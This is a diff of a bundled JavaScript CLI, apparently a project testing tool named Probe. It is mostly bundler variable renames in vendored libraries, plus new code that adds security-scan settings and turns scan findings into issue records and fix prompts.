@@ -651,19 +651,19 @@ var require_Alias = __commonJS({
           if (ctx)
             ctx.aliasResolveCache = nodes;
         }
-        let found = void 0;
+        let found3 = void 0;
         for (const node of nodes) {
           if (node === this)
             break;
           if (node.anchor === this.source)
-            found = node;
+            found3 = node;
         }
-        if (found && ctx) {
+        if (found3 && ctx) {
           const { anchors: anchors2, doc: doc2, maxAliasCount } = ctx;
-          let data = anchors2.get(found);
+          let data = anchors2.get(found3);
           if (!data) {
-            toJS.toJS(found, null, ctx);
-            data = anchors2.get(found);
+            toJS.toJS(found3, null, ctx);
+            data = anchors2.get(found3);
           }
           if (data?.res === void 0) {
             const msg = "This should not happen: Alias anchor was not resolved?";
@@ -672,14 +672,14 @@ var require_Alias = __commonJS({
           if (maxAliasCount >= 0) {
             data.count += 1;
             if (data.aliasCount === 0)
-              data.aliasCount = getAliasCount(doc2, found, anchors2);
+              data.aliasCount = getAliasCount(doc2, found3, anchors2);
             if (data.count * data.aliasCount > maxAliasCount) {
               const msg = "Excessive alias count indicates a resource exhaustion attack";
               throw new ReferenceError(msg);
             }
           }
         }
-        return found;
+        return found3;
       }
       toJSON(_arg, ctx) {
         if (!ctx)
@@ -3785,7 +3785,7 @@ var require_resolve_props = __commonJS({
       let tag = null;
       let newlineAfterProp = null;
       let comma = null;
-      let found = null;
+      let found3 = null;
       let start = null;
       for (const token of tokens) {
         if (reqSpace) {
@@ -3822,7 +3822,7 @@ var require_resolve_props = __commonJS({
             if (atNewline) {
               if (comment)
                 comment += token.source;
-              else if (!found || indicator !== "seq-item-ind")
+              else if (!found3 || indicator !== "seq-item-ind")
                 spaceBefore = true;
             } else
               commentSep += token.source;
@@ -3856,9 +3856,9 @@ var require_resolve_props = __commonJS({
           case indicator:
             if (anchor || tag)
               onError(token, "BAD_PROP_ORDER", `Anchors and tags must be after the ${token.source} indicator`);
-            if (found)
+            if (found3)
               onError(token, "UNEXPECTED_TOKEN", `Unexpected ${token.source} in ${flow ?? "collection"}`);
-            found = token;
+            found3 = token;
             atNewline = indicator === "seq-item-ind" || indicator === "explicit-key-ind";
             hasSpace = false;
             break;
@@ -3887,7 +3887,7 @@ var require_resolve_props = __commonJS({
         onError(tab, "TAB_AS_INDENT", "Tabs are not allowed as indentation");
       return {
         comma,
-        found,
+        found: found3,
         spaceBefore,
         comment,
         hasNewline,
@@ -8429,11 +8429,11 @@ var require_util = __commonJS({
       return false;
     }
     exports2.schemaHasRules = schemaHasRules;
-    function schemaHasRulesButRef(schema, RULES) {
+    function schemaHasRulesButRef(schema, RULES2) {
       if (typeof schema == "boolean")
         return !schema;
       for (const key in schema)
-        if (key !== "$ref" && RULES.all[key])
+        if (key !== "$ref" && RULES2.all[key])
           return true;
       return false;
     }
@@ -8805,12 +8805,12 @@ var require_applicability = __commonJS({
     }
     exports2.schemaHasRulesForType = schemaHasRulesForType;
     function shouldUseGroup(schema, group) {
-      return group.rules.some((rule) => shouldUseRule(schema, rule));
+      return group.rules.some((rule2) => shouldUseRule(schema, rule2));
     }
     exports2.shouldUseGroup = shouldUseGroup;
-    function shouldUseRule(schema, rule) {
+    function shouldUseRule(schema, rule2) {
       var _a;
-      return schema[rule.keyword] !== void 0 || ((_a = rule.definition.implements) === null || _a === void 0 ? void 0 : _a.some((kwd) => schema[kwd] !== void 0));
+      return schema[rule2.keyword] !== void 0 || ((_a = rule2.definition.implements) === null || _a === void 0 ? void 0 : _a.some((kwd) => schema[kwd] !== void 0));
     }
     exports2.shouldUseRule = shouldUseRule;
   }
@@ -9418,9 +9418,9 @@ var require_json_schema_traverse = __commonJS({
       cb = opts.cb || cb;
       var pre = typeof cb == "function" ? cb : cb.pre || function() {
       };
-      var post = cb.post || function() {
+      var post2 = cb.post || function() {
       };
-      _traverse(opts, pre, post, schema, "", schema);
+      _traverse(opts, pre, post2, schema, "", schema);
     };
     traverse.keywords = {
       additionalItems: true,
@@ -9466,7 +9466,7 @@ var require_json_schema_traverse = __commonJS({
       maxProperties: true,
       minProperties: true
     };
-    function _traverse(opts, pre, post, schema, jsonPtr, rootSchema, parentJsonPtr, parentKeyword, parentSchema, keyIndex) {
+    function _traverse(opts, pre, post2, schema, jsonPtr, rootSchema, parentJsonPtr, parentKeyword, parentSchema, keyIndex) {
       if (schema && typeof schema == "object" && !Array.isArray(schema)) {
         pre(schema, jsonPtr, rootSchema, parentJsonPtr, parentKeyword, parentSchema, keyIndex);
         for (var key in schema) {
@@ -9474,18 +9474,18 @@ var require_json_schema_traverse = __commonJS({
           if (Array.isArray(sch)) {
             if (key in traverse.arrayKeywords) {
               for (var i = 0; i < sch.length; i++)
-                _traverse(opts, pre, post, sch[i], jsonPtr + "/" + key + "/" + i, rootSchema, jsonPtr, key, schema, i);
+                _traverse(opts, pre, post2, sch[i], jsonPtr + "/" + key + "/" + i, rootSchema, jsonPtr, key, schema, i);
             }
           } else if (key in traverse.propsKeywords) {
             if (sch && typeof sch == "object") {
               for (var prop in sch)
-                _traverse(opts, pre, post, sch[prop], jsonPtr + "/" + key + "/" + escapeJsonPtr(prop), rootSchema, jsonPtr, key, schema, prop);
+                _traverse(opts, pre, post2, sch[prop], jsonPtr + "/" + key + "/" + escapeJsonPtr(prop), rootSchema, jsonPtr, key, schema, prop);
             }
           } else if (key in traverse.keywords || opts.allKeys && !(key in traverse.skipKeywords)) {
-            _traverse(opts, pre, post, sch, jsonPtr + "/" + key, rootSchema, jsonPtr, key, schema);
+            _traverse(opts, pre, post2, sch, jsonPtr + "/" + key, rootSchema, jsonPtr, key, schema);
           }
         }
-        post(schema, jsonPtr, rootSchema, parentJsonPtr, parentKeyword, parentSchema, keyIndex);
+        post2(schema, jsonPtr, rootSchema, parentJsonPtr, parentKeyword, parentSchema, keyIndex);
       }
     }
     function escapeJsonPtr(str) {
@@ -9827,17 +9827,17 @@ var require_validate = __commonJS({
     }
     function schemaKeywords(it, types, typeErrors, errsCount) {
       const { gen, schema, data, allErrors, opts, self } = it;
-      const { RULES } = self;
-      if (schema.$ref && (opts.ignoreKeywordsWithRef || !(0, util_1.schemaHasRulesButRef)(schema, RULES))) {
-        gen.block(() => keywordCode(it, "$ref", RULES.all.$ref.definition));
+      const { RULES: RULES2 } = self;
+      if (schema.$ref && (opts.ignoreKeywordsWithRef || !(0, util_1.schemaHasRulesButRef)(schema, RULES2))) {
+        gen.block(() => keywordCode(it, "$ref", RULES2.all.$ref.definition));
         return;
       }
       if (!opts.jtd)
         checkStrictTypes(it, types);
       gen.block(() => {
-        for (const group of RULES.rules)
+        for (const group of RULES2.rules)
           groupKeywords(group);
-        groupKeywords(RULES.post);
+        groupKeywords(RULES2.post);
       });
       function groupKeywords(group) {
         if (!(0, applicability_1.shouldUseGroup)(schema, group))
@@ -9862,9 +9862,9 @@ var require_validate = __commonJS({
       if (useDefaults)
         (0, defaults_1.assignDefaults)(it, group.type);
       gen.block(() => {
-        for (const rule of group.rules) {
-          if ((0, applicability_1.shouldUseRule)(schema, rule)) {
-            keywordCode(it, rule.keyword, rule.definition, group.type);
+        for (const rule2 of group.rules) {
+          if ((0, applicability_1.shouldUseRule)(schema, rule2)) {
+            keywordCode(it, rule2.keyword, rule2.definition, group.type);
           }
         }
       });
@@ -9899,9 +9899,9 @@ var require_validate = __commonJS({
     function checkKeywordTypes(it, ts) {
       const rules = it.self.RULES.all;
       for (const keyword in rules) {
-        const rule = rules[keyword];
-        if (typeof rule == "object" && (0, applicability_1.shouldUseRule)(it.schema, rule)) {
-          const { type } = rule.definition;
+        const rule2 = rules[keyword];
+        if (typeof rule2 == "object" && (0, applicability_1.shouldUseRule)(it.schema, rule2)) {
+          const { type } = rule2.definition;
           if (type.length && !type.some((t) => hasApplicableType(ts, t))) {
             strictTypesError(it, `missing type "${type.join(",")}" for keyword "${keyword}"`);
           }
@@ -10315,7 +10315,7 @@ var require_compile = __commonJS({
       const schOrFunc = root.refs[ref];
       if (schOrFunc)
         return schOrFunc;
-      let _sch = resolve7.call(this, root, ref);
+      let _sch = resolve9.call(this, root, ref);
       if (_sch === void 0) {
         const schema = (_a = root.localRefs) === null || _a === void 0 ? void 0 : _a[ref];
         const { schemaId } = this.opts;
@@ -10342,7 +10342,7 @@ var require_compile = __commonJS({
     function sameSchemaEnv(s1, s2) {
       return s1.schema === s2.schema && s1.root === s2.root && s1.baseId === s2.baseId;
     }
-    function resolve7(root, ref) {
+    function resolve9(root, ref) {
       let sch;
       while (typeof (sch = this.refs[ref]) == "string")
         ref = sch;
@@ -11206,7 +11206,7 @@ var require_fast_uri = __commonJS({
       }
       return uri;
     }
-    function resolve7(baseURI, relativeURI, options) {
+    function resolve9(baseURI, relativeURI, options) {
       const schemelessOptions = options ? Object.assign({ scheme: "null" }, options) : { scheme: "null" };
       const {
         parsed: baseParsed,
@@ -11242,50 +11242,50 @@ var require_fast_uri = __commonJS({
       schemelessOptions.skipEscape = true;
       return serialize(resolved, schemelessOptions);
     }
-    function resolveComponent(base, relative11, options, skipNormalization) {
+    function resolveComponent(base, relative14, options, skipNormalization) {
       const target = {};
       if (!skipNormalization) {
         base = parse9(serialize(base, options), options);
-        relative11 = parse9(serialize(relative11, options), options);
+        relative14 = parse9(serialize(relative14, options), options);
       }
       options = options || {};
-      if (!options.tolerant && relative11.scheme) {
-        target.scheme = relative11.scheme;
-        target.userinfo = relative11.userinfo;
-        target.host = relative11.host;
-        target.port = relative11.port;
-        target.path = removeDotSegments(relative11.path || "");
-        target.query = relative11.query;
+      if (!options.tolerant && relative14.scheme) {
+        target.scheme = relative14.scheme;
+        target.userinfo = relative14.userinfo;
+        target.host = relative14.host;
+        target.port = relative14.port;
+        target.path = removeDotSegments(relative14.path || "");
+        target.query = relative14.query;
       } else {
-        if (relative11.userinfo !== void 0 || relative11.host !== void 0 || relative11.port !== void 0) {
-          target.userinfo = relative11.userinfo;
-          target.host = relative11.host;
-          target.port = relative11.port;
-          target.path = removeDotSegments(relative11.path || "");
-          target.query = relative11.query;
+        if (relative14.userinfo !== void 0 || relative14.host !== void 0 || relative14.port !== void 0) {
+          target.userinfo = relative14.userinfo;
+          target.host = relative14.host;
+          target.port = relative14.port;
+          target.path = removeDotSegments(relative14.path || "");
+          target.query = relative14.query;
         } else {
-          if (!relative11.path) {
+          if (!relative14.path) {
             target.path = base.path;
-            if (relative11.query !== void 0) {
-              target.query = relative11.query;
+            if (relative14.query !== void 0) {
+              target.query = relative14.query;
             } else {
               target.query = base.query;
             }
           } else {
-            if (relative11.path[0] === "/") {
-              target.path = removeDotSegments(relative11.path);
+            if (relative14.path[0] === "/") {
+              target.path = removeDotSegments(relative14.path);
             } else {
               const baseHasAuthority = base.userinfo !== void 0 || base.host !== void 0 || base.port !== void 0;
               if (baseHasAuthority && !base.path) {
-                target.path = "/" + relative11.path;
+                target.path = "/" + relative14.path;
               } else if (!base.path) {
-                target.path = relative11.path;
+                target.path = relative14.path;
               } else {
-                target.path = base.path.slice(0, base.path.lastIndexOf("/") + 1) + relative11.path;
+                target.path = base.path.slice(0, base.path.lastIndexOf("/") + 1) + relative14.path;
               }
               target.path = base.scheme === void 0 && !baseHasAuthority && target.path[0] !== "/" ? removeDotSegmentsRelative(target.path) : removeDotSegments(target.path);
             }
-            target.query = relative11.query;
+            target.query = relative14.query;
           }
           target.userinfo = base.userinfo;
           target.host = base.host;
@@ -11293,7 +11293,7 @@ var require_fast_uri = __commonJS({
         }
         target.scheme = base.scheme;
       }
-      target.fragment = relative11.fragment;
+      target.fragment = relative14.fragment;
       return target;
     }
     function equal(uriA, uriB, options) {
@@ -11597,7 +11597,7 @@ var require_fast_uri = __commonJS({
     var fastUri = {
       SCHEMES,
       normalize: normalize3,
-      resolve: resolve7,
+      resolve: resolve9,
       resolveComponent,
       equal,
       serialize,
@@ -11987,16 +11987,16 @@ var require_core = __commonJS({
         return this;
       }
       getKeyword(keyword) {
-        const rule = this.RULES.all[keyword];
-        return typeof rule == "object" ? rule.definition : !!rule;
+        const rule2 = this.RULES.all[keyword];
+        return typeof rule2 == "object" ? rule2.definition : !!rule2;
       }
       // Remove keyword
       removeKeyword(keyword) {
-        const { RULES } = this;
-        delete RULES.keywords[keyword];
-        delete RULES.all[keyword];
-        for (const group of RULES.rules) {
-          const i = group.rules.findIndex((rule) => rule.keyword === keyword);
+        const { RULES: RULES2 } = this;
+        delete RULES2.keywords[keyword];
+        delete RULES2.all[keyword];
+        for (const group of RULES2.rules) {
+          const i = group.rules.findIndex((rule2) => rule2.keyword === keyword);
           if (i >= 0)
             group.rules.splice(i, 1);
         }
@@ -12023,10 +12023,10 @@ var require_core = __commonJS({
           for (const seg of segments)
             keywords = keywords[seg];
           for (const key in rules) {
-            const rule = rules[key];
-            if (typeof rule != "object")
+            const rule2 = rules[key];
+            if (typeof rule2 != "object")
               continue;
-            const { $data } = rule.definition;
+            const { $data } = rule2.definition;
             const schema = keywords[key];
             if ($data && schema)
               keywords[key] = schemaOrData(schema);
@@ -12163,9 +12163,9 @@ var require_core = __commonJS({
     }
     var KEYWORD_NAME = /^[a-z_$][a-z0-9_$:-]*$/i;
     function checkKeyword(keyword, def) {
-      const { RULES } = this;
+      const { RULES: RULES2 } = this;
       (0, util_1.eachItem)(keyword, (kwd) => {
-        if (RULES.keywords[kwd])
+        if (RULES2.keywords[kwd])
           throw new Error(`Keyword ${kwd} is already defined`);
         if (!KEYWORD_NAME.test(kwd))
           throw new Error(`Keyword ${kwd} has invalid name`);
@@ -12178,19 +12178,19 @@ var require_core = __commonJS({
     }
     function addRule(keyword, definition, dataType) {
       var _a;
-      const post = definition === null || definition === void 0 ? void 0 : definition.post;
-      if (dataType && post)
+      const post2 = definition === null || definition === void 0 ? void 0 : definition.post;
+      if (dataType && post2)
         throw new Error('keyword with "post" flag cannot have "type"');
-      const { RULES } = this;
-      let ruleGroup = post ? RULES.post : RULES.rules.find(({ type: t }) => t === dataType);
+      const { RULES: RULES2 } = this;
+      let ruleGroup = post2 ? RULES2.post : RULES2.rules.find(({ type: t }) => t === dataType);
       if (!ruleGroup) {
         ruleGroup = { type: dataType, rules: [] };
-        RULES.rules.push(ruleGroup);
+        RULES2.rules.push(ruleGroup);
       }
-      RULES.keywords[keyword] = true;
+      RULES2.keywords[keyword] = true;
       if (!definition)
         return;
-      const rule = {
+      const rule2 = {
         keyword,
         definition: {
           ...definition,
@@ -12199,18 +12199,18 @@ var require_core = __commonJS({
         }
       };
       if (definition.before)
-        addBeforeRule.call(this, ruleGroup, rule, definition.before);
+        addBeforeRule.call(this, ruleGroup, rule2, definition.before);
       else
-        ruleGroup.rules.push(rule);
-      RULES.all[keyword] = rule;
+        ruleGroup.rules.push(rule2);
+      RULES2.all[keyword] = rule2;
       (_a = definition.implements) === null || _a === void 0 ? void 0 : _a.forEach((kwd) => this.addKeyword(kwd));
     }
-    function addBeforeRule(ruleGroup, rule, before) {
+    function addBeforeRule(ruleGroup, rule2, before) {
       const i = ruleGroup.rules.findIndex((_rule) => _rule.keyword === before);
       if (i >= 0) {
-        ruleGroup.rules.splice(i, 0, rule);
+        ruleGroup.rules.splice(i, 0, rule2);
       } else {
-        ruleGroup.rules.push(rule);
+        ruleGroup.rules.push(rule2);
         this.logger.warn(`rule ${before} is not defined`);
       }
     }
@@ -14587,7 +14587,7 @@ var require_dist2 = __commonJS({
 });
 
 // src/cli.ts
-var import_node_fs31 = require("node:fs");
+var import_node_fs36 = require("node:fs");
 
 // src/agent/headless.ts
 var import_node_fs2 = require("node:fs");
@@ -15168,6 +15168,7 @@ var DEFAULTS = {
   tickets: { pattern: "[A-Z][A-Z0-9]+-\\d+" },
   agents: { runner: "claude", model: RUNNER_DEFAULT_MODEL.claude },
   watch: { enabled: true, drafts: true, maxFeatures: 3, impactDepth: 1 },
+  security: { osv: true, historyCommits: 300, failOn: "high", skip: [], ignorePaths: [] },
   devices: { allowReal: [] }
 };
 function configPath(root) {
@@ -15190,6 +15191,7 @@ function loadConfig(root, localDir) {
     tickets: { ...DEFAULTS.tickets, ...raw.tickets },
     agents: resolveAgents(raw.agents, local.agents),
     watch: { ...DEFAULTS.watch, ...raw.watch },
+    security: { ...DEFAULTS.security, ...raw.security },
     devices: { avd: local.devices?.avd, allowReal: local.devices?.allowReal ?? [] }
   };
 }
@@ -15325,7 +15327,7 @@ tickets:
 `;
 function isExcluded(config2, featureId, moduleId) {
   return config2.exclude.some(
-    (rule) => featureId === rule || featureId.startsWith(`${rule}:`) || (moduleId?.startsWith(rule) ?? false)
+    (rule2) => featureId === rule2 || featureId.startsWith(`${rule2}:`) || (moduleId?.startsWith(rule2) ?? false)
   );
 }
 function saveProject(root, patch) {
@@ -15379,17 +15381,17 @@ function testNamesIn(text2) {
 
 // src/adapters/generic/areas.ts
 var CONTAINER_DIRS = /* @__PURE__ */ new Set(["src", "lib", "libs", "packages", "apps", "modules", "services", "pkg", "internal", "cmd", "components", "crates", "plugins", "features"]);
-function listProjectFiles(root, ignored) {
+function listProjectFiles(root, ignored2) {
   const git2 = (0, import_node_child_process2.spawnSync)("git", ["ls-files", "-co", "--exclude-standard"], { cwd: root, encoding: "utf8", windowsHide: true, maxBuffer: 256 * 1024 * 1024, timeout: 6e4 });
-  const listed = !git2.error && git2.status === 0 ? git2.stdout.split("\n").map((l) => l.trim()).filter(Boolean) : walk(root, ignored);
-  return listed.filter((f) => !ignored.test(f) && !f.startsWith("probe/"));
+  const listed = !git2.error && git2.status === 0 ? git2.stdout.split("\n").map((l) => l.trim()).filter(Boolean) : walk(root, ignored2);
+  return listed.filter((f) => !ignored2.test(f) && !f.startsWith("probe/"));
 }
-function walk(root, ignored) {
+function walk(root, ignored2) {
   const out = [];
   const visit = (rel) => {
     for (const entry of (0, import_node_fs5.readdirSync)((0, import_node_path6.join)(root, rel), { withFileTypes: true })) {
       const path = rel ? `${rel}/${entry.name}` : entry.name;
-      if (ignored.test(path)) continue;
+      if (ignored2.test(path)) continue;
       if (entry.isDirectory()) visit(path);
       else if (entry.isFile()) out.push(path);
     }
@@ -18194,10 +18196,10 @@ var ZodObject = class _ZodObject extends ZodType {
       catchall: index
     });
   }
-  pick(mask) {
+  pick(mask2) {
     const shape = {};
-    for (const key of util.objectKeys(mask)) {
-      if (mask[key] && this.shape[key]) {
+    for (const key of util.objectKeys(mask2)) {
+      if (mask2[key] && this.shape[key]) {
         shape[key] = this.shape[key];
       }
     }
@@ -18206,10 +18208,10 @@ var ZodObject = class _ZodObject extends ZodType {
       shape: () => shape
     });
   }
-  omit(mask) {
+  omit(mask2) {
     const shape = {};
     for (const key of util.objectKeys(this.shape)) {
-      if (!mask[key]) {
+      if (!mask2[key]) {
         shape[key] = this.shape[key];
       }
     }
@@ -18224,11 +18226,11 @@ var ZodObject = class _ZodObject extends ZodType {
   deepPartial() {
     return deepPartialify(this);
   }
-  partial(mask) {
+  partial(mask2) {
     const newShape = {};
     for (const key of util.objectKeys(this.shape)) {
       const fieldSchema = this.shape[key];
-      if (mask && !mask[key]) {
+      if (mask2 && !mask2[key]) {
         newShape[key] = fieldSchema;
       } else {
         newShape[key] = fieldSchema.optional();
@@ -18239,10 +18241,10 @@ var ZodObject = class _ZodObject extends ZodType {
       shape: () => newShape
     });
   }
-  required(mask) {
+  required(mask2) {
     const newShape = {};
     for (const key of util.objectKeys(this.shape)) {
-      if (mask && !mask[key]) {
+      if (mask2 && !mask2[key]) {
         newShape[key] = this.shape[key];
       } else {
         const fieldSchema = this.shape[key];
@@ -20016,13 +20018,13 @@ function devicesUnsupported(adapter) {
 // src/engine/app.ts
 function resolveApp(project) {
   const set = project.config.app;
-  const found = project.adapter.detectApp(project.root);
+  const found3 = project.adapter.detectApp(project.root);
   return {
-    package: set.package ?? found?.package,
-    installTask: set.installTask ?? found?.installTask,
-    packageSource: set.package ? "probe.yaml" : found?.package ? found.source : null,
-    installSource: set.installTask ? "probe.yaml" : found ? "detected" : null,
-    module: found?.module
+    package: set.package ?? found3?.package,
+    installTask: set.installTask ?? found3?.installTask,
+    packageSource: set.package ? "probe.yaml" : found3?.package ? found3.source : null,
+    installSource: set.installTask ? "probe.yaml" : found3 ? "detected" : null,
+    module: found3?.module
   };
 }
 
@@ -20079,23 +20081,23 @@ function parseUiTree(xml) {
   const out = [];
   for (const m of xml.matchAll(/<node\b([^>]*?)\/?>/g)) {
     const a = m[1];
-    const get = (name) => decode(new RegExp(`\\b${name}="([^"]*)"`).exec(a)?.[1] ?? "");
-    const b = /\[(\d+),(\d+)\]\[(\d+),(\d+)\]/.exec(get("bounds"));
+    const get2 = (name) => decode(new RegExp(`\\b${name}="([^"]*)"`).exec(a)?.[1] ?? "");
+    const b = /\[(\d+),(\d+)\]\[(\d+),(\d+)\]/.exec(get2("bounds"));
     if (!b) continue;
     const bounds = [Number(b[1]), Number(b[2]), Number(b[3]), Number(b[4])];
     if (bounds[2] - bounds[0] <= 1 || bounds[3] - bounds[1] <= 1) continue;
     const el = {
       index: 0,
-      text: get("text"),
-      desc: get("content-desc"),
-      id: get("resource-id").replace(/^.*:id\//, ""),
-      cls: get("class").split(".").pop() ?? "",
-      clickable: get("clickable") === "true" || get("long-clickable") === "true",
-      enabled: get("enabled") !== "false",
-      focused: get("focused") === "true",
-      checked: get("checked") === "true",
-      scrollable: get("scrollable") === "true",
-      password: get("password") === "true",
+      text: get2("text"),
+      desc: get2("content-desc"),
+      id: get2("resource-id").replace(/^.*:id\//, ""),
+      cls: get2("class").split(".").pop() ?? "",
+      clickable: get2("clickable") === "true" || get2("long-clickable") === "true",
+      enabled: get2("enabled") !== "false",
+      focused: get2("focused") === "true",
+      checked: get2("checked") === "true",
+      scrollable: get2("scrollable") === "true",
+      password: get2("password") === "true",
       center: [Math.round((bounds[0] + bounds[2]) / 2), Math.round((bounds[1] + bounds[3]) / 2)],
       bounds
     };
@@ -20630,7 +20632,7 @@ function unitFingerprint(project, scan2, featureId) {
   const feature = scan2.features.find((f) => f.id === featureId);
   return new ContentIndex(project, allModules(scan2)).fingerprint(feature?.modules.map((m) => m.id) ?? [], true);
 }
-function recordCardResult(project, run, fingerprint) {
+function recordCardResult(project, run, fingerprint2) {
   if (run.status !== "passed" && run.status !== "failed") return;
   const ledger = readLedger(project.root, run.feature);
   ledger.cards = {
@@ -20644,12 +20646,12 @@ function recordCardResult(project, run, fingerprint) {
       by: gitUser(project.root),
       device: run.device,
       perf: run.perf ? { startupMs: run.perf.startupMs, jankyPct: run.perf.jankyPct, p90Ms: run.perf.p90Ms } : void 0,
-      fingerprint
+      fingerprint: fingerprint2
     }
   };
   writeLedger(project.root, run.feature, ledger);
 }
-function recordUnitResult(project, run, fingerprint) {
+function recordUnitResult(project, run, fingerprint2) {
   if (!["passed", "failed", "error"].includes(run.status) || run.status === "error" && !/Build exited/.test(run.error ?? "")) return;
   const ledger = readLedger(project.root, run.feature);
   ledger.unit = {
@@ -20661,7 +20663,7 @@ function recordUnitResult(project, run, fingerprint) {
     by: gitUser(project.root),
     tests: run.results.reduce((n, r) => n + r.tests, 0),
     failed: run.results.reduce((n, r) => n + r.failed, 0),
-    fingerprint
+    fingerprint: fingerprint2
   };
   writeLedger(project.root, run.feature, ledger);
 }
@@ -20760,7 +20762,7 @@ function startCardRun(project, feature, cardId, options = {}) {
     costUsd: 0
   };
   return launchRun(project, run, async (log) => {
-    const fingerprint = cardFingerprint(project, latestScan(project), card);
+    const fingerprint2 = cardFingerprint(project, latestScan(project), card);
     const session = await runOnDevice(
       project,
       run,
@@ -20780,7 +20782,7 @@ function startCardRun(project, feature, cardId, options = {}) {
       if (run.status === "passed") recordDeviceRun(project.root, feature, cardId, run.id);
     }
     log(`verdict: ${run.status}${run.verdict?.notes ? ` \xB7 ${run.verdict.notes}` : ""}`);
-    recordCardResult(project, run, fingerprint);
+    recordCardResult(project, run, fingerprint2);
   });
 }
 function summarizeCardRun(run) {
@@ -21334,13 +21336,13 @@ function doctor(project, error2) {
 }
 function agentCliCheck(runnerId, version2 = (cmd, args) => capture(cmd, args)) {
   const runner = agentRunner(runnerId);
-  const found = version2(runner.command, runner.versionArgs);
+  const found3 = version2(runner.command, runner.versionArgs);
   return {
     id: "agent-cli",
     label: `Agent CLI (${runner.id})`,
-    status: found ? "ok" : "warn",
-    detail: found ? `${runner.label} ${found}` : `${runner.command} not found (only needed for agent features: cards, device runs, test writing)`,
-    fix: found ? void 0 : `${runner.installHint}, or set agents.runner in probe/probe.yaml or Studio \u2192 Settings`
+    status: found3 ? "ok" : "warn",
+    detail: found3 ? `${runner.label} ${found3}` : `${runner.command} not found (only needed for agent features: cards, device runs, test writing)`,
+    fix: found3 ? void 0 : `${runner.installHint}, or set agents.runner in probe/probe.yaml or Studio \u2192 Settings`
   };
 }
 function formatDoctor(checks) {
@@ -21504,8 +21506,8 @@ function needsCards(project, feature) {
   }
 }
 function agentFileDone(project) {
-  const read = (p) => (0, import_node_fs15.existsSync)((0, import_node_path19.join)(project.root, p)) ? (0, import_node_fs15.readFileSync)((0, import_node_path19.join)(project.root, p), "utf8") : "";
-  return read("AGENTS.md").includes(`${FEATURES_DIR}/`) && /^@AGENTS\.md\s*$/m.test(read("CLAUDE.md"));
+  const read2 = (p) => (0, import_node_fs15.existsSync)((0, import_node_path19.join)(project.root, p)) ? (0, import_node_fs15.readFileSync)((0, import_node_path19.join)(project.root, p), "utf8") : "";
+  return read2("AGENTS.md").includes(`${FEATURES_DIR}/`) && /^@AGENTS\.md\s*$/m.test(read2("CLAUDE.md"));
 }
 function isInitStep(id) {
   return INIT_STEPS.some((s) => s.id === id);
@@ -22319,14 +22321,14 @@ function resolveImports(file, text2, sources) {
   const dir = import_node_path26.posix.dirname(file);
   const lookup = (path) => sources.get(path) ?? sources.get(`${path}/index`) ?? sources.get(`${path}/__init__`);
   for (const m of text2.matchAll(/(?:\bfrom\s+|\bimport\s*\(?\s*|\brequire\(\s*)["'](\.{1,2}\/[^"']+)["']/g)) {
-    const found = lookup(import_node_path26.posix.normalize(import_node_path26.posix.join(dir, m[1])).replace(/\.(m?[jt]sx?|c[jt]s)$/, ""));
-    if (found) out.add(found);
+    const found3 = lookup(import_node_path26.posix.normalize(import_node_path26.posix.join(dir, m[1])).replace(/\.(m?[jt]sx?|c[jt]s)$/, ""));
+    if (found3) out.add(found3);
   }
   if (file.endsWith(".py")) {
     for (const m of text2.matchAll(/^\s*(?:from|import)\s+([\w.]+)/gm)) {
       const path = m[1].replace(/\./g, "/");
-      const found = lookup(path) ?? [...sources.keys()].filter((k) => k.endsWith(`/${path}`)).map((k) => sources.get(k))[0];
-      if (found) out.add(found);
+      const found3 = lookup(path) ?? [...sources.keys()].filter((k) => k.endsWith(`/${path}`)).map((k) => sources.get(k))[0];
+      if (found3) out.add(found3);
     }
   }
   return out;
@@ -22685,20 +22687,21 @@ function openProject(explicit) {
 // src/engine/issues.ts
 var import_node_path31 = require("node:path");
 function issuesOf(project, run) {
-  const read = (id) => id ? project.store.read(`runs/${id}.json`) : null;
+  const read2 = (id) => id ? project.store.read(`runs/${id}.json`) : null;
   if (run.kind === "verify") {
-    return run.features.flatMap((f) => [read(f.unitRun), ...f.cards.map((c) => read(c.runId))].flatMap((r) => r ? issuesOf(project, r) : []));
+    return run.features.flatMap((f) => [read2(f.unitRun), ...f.cards.map((c) => read2(c.runId))].flatMap((r) => r ? issuesOf(project, r) : []));
   }
   if (run.kind === "check") {
     return run.features.flatMap((f) => {
-      const unit = read(f.unitRun);
+      const unit = read2(f.unitRun);
       return unit ? issuesOf(project, unit) : [];
     });
   }
   if (run.kind === "unitwrite") {
-    const unit = read(run.unitRun);
+    const unit = read2(run.unitRun);
     return unit ? issuesOf(project, unit) : [];
   }
+  if (run.kind === "security") return securityIssues(run);
   const out = [];
   if (run.kind === "unit") out.push(...unitIssues(run));
   if (run.kind === "card" || run.kind === "explore" || run.kind === "login") {
@@ -22726,6 +22729,20 @@ function buildFailure(log) {
   const block = log.slice(start + 1, end < 0 ? start + 12 : end).map((l) => l.trim()).filter(Boolean);
   return block.length ? block.join("\n") : null;
 }
+function securityIssues(run) {
+  return run.findings.map((f, n) => ({
+    id: `${run.id}:${n}`,
+    runId: run.id,
+    feature: f.feature,
+    kind: "security",
+    title: `[${f.severity}] ${f.title}`.slice(0, 160),
+    detail: `${f.check}${f.file ? ` \xB7 ${f.file}${f.line ? `:${f.line}` : ""}` : ""} \xB7 ${f.layer}
+${f.evidence}
+
+${f.why}`,
+    security: f
+  }));
+}
 function unitIssues(run) {
   return run.results.flatMap(
     (r) => r.failures.map((t) => ({
@@ -22752,6 +22769,7 @@ function findIssue(project, issueId) {
   return run && issue2 ? { issue: issue2, run } : null;
 }
 function fixPrompt(project, issue2, run, forProbe) {
+  if (issue2.security) return securityFixPrompt(project, issue2.security, run, forProbe);
   const feature = findFeature(latestScan(project), issue2.feature);
   const modules = feature?.modules.map((m) => `- ${m.id} \u2014 ${(0, import_node_path31.relative)(project.root, m.dir).replace(/\\/g, "/") || "."}`).join("\n") ?? "- (unknown)";
   const parts = [`Fix one problem that Probe found in the "${issue2.feature}" feature of the project in the current directory.`, `## The problem
@@ -22794,6 +22812,57 @@ ${check2}
 Never commit, stage, push or switch branches.`);
   return parts.join("\n\n");
 }
+var LAYER_SEEN = {
+  static: "a pattern rule over the source",
+  deps: "the dependency versions in a lockfile, against the OSV vulnerability database",
+  history: "the git history",
+  artifact: "the built app on disk",
+  runtime: "the running app",
+  agent: "an agent reading the code (advisory: confirm it before changing anything)"
+};
+function securityFixPrompt(project, f, run, forProbe) {
+  const feature = findFeature(latestScan(project), f.feature);
+  const modules = feature?.modules.map((m) => `- ${m.id} \u2014 ${(0, import_node_path31.relative)(project.root, m.dir).replace(/\\/g, "/") || "."}`).join("\n");
+  const parts = [
